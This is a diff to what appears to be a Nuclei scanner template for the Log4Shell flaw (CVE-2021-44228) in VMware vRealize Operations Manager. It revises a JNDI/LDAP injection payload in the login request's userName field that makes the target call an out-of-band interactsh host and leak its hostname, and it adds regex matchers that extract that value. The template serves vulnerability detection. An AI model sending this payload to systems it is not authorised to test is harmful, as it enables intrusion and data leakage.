@@ -15,9 +15,14 @@ info:
     cve-id: CVE-2021-44228
     cwe-id: CWE-77
   metadata:
+    max-request: 1
     shodan-query: title:"vRealize Operations Manager"
     verified: "true"
   tags: cve,cve2021,rce,jndi,log4j,vmware,kev,oast
+
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
 
 http:
   - raw:
@@ -32,7 +37,7 @@ http:
         Sec-Fetch-Mode: cors
         Sec-Fetch-Site: same-origin
 
-        mainAction=login&userName=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&password=admin&authSourceId=localItem&authSourceName=Local%20Users&authSourceType=LOCAL&forceLogin=&timezone=330&languageCode=us
+        mainAction=login&userName=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&password=admin&authSourceId=localItem&authSourceName=Local%20Users&authSourceType=LOCAL&forceLogin=&timezone=330&languageCode=us
 
     matchers-condition: and
     matchers:
@@ -44,7 +49,7 @@ http:
       - type: regex
         part: interactsh_request
         regex:
-          - '([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+'  # Match for extracted ${sys:os.name} variable
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
       - type: word
         part: header
@@ -58,6 +63,12 @@ http:
 
       - type: regex
         part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print injection point in output
+
+      - type: regex
+        part: interactsh_request
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${sys:os.name} in output
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
